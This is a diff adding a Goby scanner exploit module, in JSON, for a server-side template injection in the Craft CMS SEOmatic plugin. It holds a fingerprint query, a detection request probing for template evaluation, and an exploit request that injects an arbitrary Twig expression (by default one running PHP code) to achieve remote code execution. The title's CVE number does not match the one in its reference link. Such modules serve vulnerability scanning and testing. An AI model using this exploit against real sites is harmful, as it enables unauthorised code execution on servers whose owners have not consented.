@@ -1,0 +1,115 @@
+{
+      "Name": "CraftCMS Seomatic RCE CVE-2020-9597",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "(title==\"Welcome to Craft CMS\"  | body=\"href=\\\"http://craftcms.com/\\\"\" | body=\"SEOmatic\" | header=\"Craft CMS\" | header=\"Craft CMS, SEOmatic\")",
+      "Description": "The SEOmatic component before 3.3.0 for Craft CMS allows Server-Side Template Injection that leads to RCE via malformed data to the metacontainers controller.",
+      "Product": "craftcms",
+      "Homepage": "https://craftcms.com/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9757"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "craft.app.view.evaluateDynamicContent('phpinfo();')"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/actions/seomatic/meta-container/meta-link-container/?uri={{5*'5'}}",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": [
+                              "r1|rand|int|2",
+                              "r2|rand|int|2"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "MetaLinkContainer",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "canonical",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "25",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/actions/seomatic/meta-container/meta-link-container/?uri=%7B%7B{{{cmd}}}%7D%7D",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-11 20:45:35",
+      "GobyVersion": "1.8.302"
+}
